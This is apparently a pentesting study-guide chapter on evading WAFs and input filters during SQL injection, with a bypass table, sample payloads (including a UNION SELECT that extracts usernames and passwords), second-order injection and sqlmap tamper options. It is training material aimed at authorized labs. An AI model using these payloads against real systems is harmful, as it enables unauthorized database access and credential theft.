# Chapter 14 — Evasion Techniques (WAF / Filter Bypass)

## About the Topic
Many real-world targets have weak input filters or a Web Application
Firewall (WAF) blocking obvious payloads (spaces, `UNION`, `SELECT`,
quotes). Evasion techniques restructure a payload so it still executes as
valid SQL while avoiding the specific pattern the filter blocks.

> Use these only against authorized lab/engagement targets — evasion
> against production WAFs outside of an authorized scope is illegal.

## Common Evasion Techniques

| Filter blocks | Bypass technique | Example |
|---|---|---|
| Spaces | Comments / whitespace alternatives | `UNION/**/SELECT`, `UNION%0aSELECT` |
| `UNION` keyword | Case variation | `UnIoN SeLeCt` |
| `SELECT` keyword | Inline comments | `SEL/**/ECT` |
| Quotes stripped | Hex/char encoding | `0x61646d696e` instead of `'admin'` |
| `=` blocked | Alternative operators | `LIKE`, `IN`, `<>`  |
| `OR`/`AND` blocked | Symbolic equivalents | `\|\|` for OR, `&&` for AND (MySQL) |
| Basic keyword blacklist | Double encoding | `%2527` (double URL-encoded quote) |
| Length limits | Second-order injection | Payload stored now, executed later in a different query |

## Practical Example
Blocked: `' OR 1=1 --`

Evasion attempts:
```sql
'/**/OR/**/1=1--
'%20OR%201=1--
' oR 1=1#
'||'1'='1
' OR 1=1-- -
1' UnIoN SeLeCt username,password FrOm users--
```

### Bypassing Basic Keyword Blacklists
If `SELECT` is blocked case-sensitively:
```sql
SeLeCt * FrOm users
```
If spaces are stripped/blocked:
```sql
SELECT/**/*/**/FROM/**/users
SELECT(username)FROM(users)
```

### Second-Order SQL Injection
Payload is stored safely (e.g., in a "display name" field) but later
concatenated unsafely into a **different** query (e.g., an admin report
generator) — bypasses filters entirely because the injection point and
execution point are different code paths.

## Offensive Tips
- sqlmap automates most of this via `--tamper` scripts:
  `space2comment`, `charencode`, `randomcase`, `apostrophemask`,
  `between` — chain multiple: `--tamper=space2comment,charencode`.
- Always test the simplest bypass first (case variation, comments) before
  reaching for encoding tricks — WAFs vary wildly in sophistication.
- Document exactly which filter/rule you bypassed and how — this is
  critical for the client's remediation report.

## Labs to Practice
- **PortSwigger Academy** — *WAF bypass* labs under "SQL injection" and
  the dedicated "Web application firewalls" topic.
- **TryHackMe** — rooms covering WAF bypass techniques (e.g., *Intro to
  WAFs*, or filter-bypass tasks within SQLi rooms).
- **HackTheBox** — machines with ModSecurity/Cloudflare-style WAFs in
  front of a vulnerable login/search form.

## Key Takeaway
Filters and WAFs raise the bar, they don't remove the vulnerability —
evasion is about finding an equivalent SQL construct the filter didn't
anticipate.
